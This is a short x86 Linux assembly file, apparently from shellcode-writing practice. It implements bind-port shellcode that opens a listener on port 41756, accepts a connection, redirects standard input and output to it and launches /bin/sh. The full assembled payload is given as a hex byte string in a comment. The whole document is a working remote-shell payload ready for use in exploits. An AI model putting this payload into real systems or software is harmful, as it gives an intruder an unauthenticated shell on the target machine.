; Leander Metcalf
; 24 October 2014
; Bind Port Shellcode
;
; This Shellcode will create a listener on the target machine based
; on the port below
;
; nasm -f bin bindport-shellcode.asm

%comment 
my $shellcode =
"\x31\xdb\x53\x6a\x01\x6a\x02\x89\xe1\x43\xb8\x66\x00\x00\x00" . 
"\xcd\x80\x31\xd2\x5b\x5e\x52\x66\x68\x1c\xa3\x66\x53\x89\xe1" . 
"\x6a\x10\x51\x50\x89\xe1\xb8\x66\x00\x00\x00\xcd\x80\x5f\x52" . 
"\x57\x89\xe1\xbb\x04\x00\x00\x00\xb8\x66\x00\x00\x00\xcd\x80" . 
"\x52\x57\x89\xe1\x43\xb8\x66\x00\x00\x00\xcd\x80\x89\xc3\x31" . 
"\xc9\xb9\x02\x00\x00\x00\xb8\x3f\x00\x00\x00\x49\xcd\x80\x41" . 
"\xe2\xf5\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" . 
"\x52\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";
# Shellcode Length: 115
%endcomment

BITS 32
SECTION .text 	; Section containing code
global _start 			 ; Entry Point
; int socketcall(int call, unsigned long *args);
; System call number 102 (0x66)
; ebx holds the socket function number  ->  See /usr/include/linux/net.h

_start:
open_socket:
    xor     ebx, ebx
    push    ebx
    push    0x1
    push    0x2
    mov     ecx, esp
    inc     ebx
    mov     al, 0x66
    int     0x80
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
bind_socket:
    xor     edx, edx
    pop     ebx
    ; setup sockaddr
    pop     esi
    push    edx
    push    word 0xa31c  ;port 41756
    push    bx
    mov     ecx, esp
    ; setup bind arguments
    push    byte 0x10
    push    ecx
    push    eax
    mov     ecx, esp
    mov     al, 0x66
    int     0x80
listen_socket:
    pop     edi
    push    edx
    push    edi
    mov     ecx, esp
    mov     bl, 0x4
    mov     al, 0x66
    int     0x80
accept_incoming:
    push    edx
    push    edi
    mov     ecx, esp
    inc     ebx
    mov     al, 0x66
    int     0x80
dup_incoming:
    mov     ebx,eax      ;ebx=client_sock
    xor     ecx,ecx
    mov     cl, 3        ;dup stderr, stdout, stdin
dup_loop:
    mov     al, 0x3f
    dec     ecx
    int     0x80
    inc     ecx
    loop    dup_loop
execve:
    push   edx
    push   dword 0x68732f2f
    push   dword 0x6e69622f
    mov    ebx, esp
    push   edx
    mov    ecx, esp
    mov    al, 0xb
    int    0x80
